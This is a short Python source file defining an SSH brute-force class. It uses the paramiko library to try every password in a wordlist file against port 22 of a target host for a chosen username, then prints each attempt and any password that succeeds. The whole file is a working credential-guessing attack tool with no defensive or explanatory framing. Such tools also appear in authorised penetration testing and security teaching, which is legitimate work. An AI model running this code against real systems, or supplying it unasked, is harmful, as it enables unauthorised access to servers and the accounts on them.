import paramiko
from datetime import datetime

class SSH_BRUTEFORCE:
    def __init__(self, target, username, wordlist):
        self.target = target
        self.username = username
        self.wordlist = wordlist

    def ssh_connection_status(self, password, status=True):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh_client.connect(self.target, port=22, username=self.username, password=password)

        except paramiko.AuthenticationException:
            status = False

        ssh_client.close()

        return status
    
    def start(self):
        try:
            with open(self.wordlist, "r") as file:
                for line in file.readlines():
                    password = line.strip()

                    try:
                        connection_status = self.ssh_connection_status(password=password)

                        if connection_status == True:
                            print(f"{'=' * 25}|Status|{'=' * 25}\n\n[{datetime.now()}]\033[32m PASSWORD FOUND !!\033[0m\n\n[Password --> ({password})]\n\n")  
                            break
                        
                        else:
                            print(f"{'=' * 25}|Status|{'=' * 25}\n\n[{datetime.now()}]\033[31m Not Found\033[0m\n\n[Current Password --> ({password})]\n\n")
                    
                    except Exception as e:
                        print(str(e))
                
                print(f"{'=' * 25}|Status|{'=' * 25}\n\n[{datetime.now()}]\033[33m WordList Finished\033[0m\n\n[Current Password --> (None)]\n\n")

        except FileNotFoundError:
            print("File Not Found")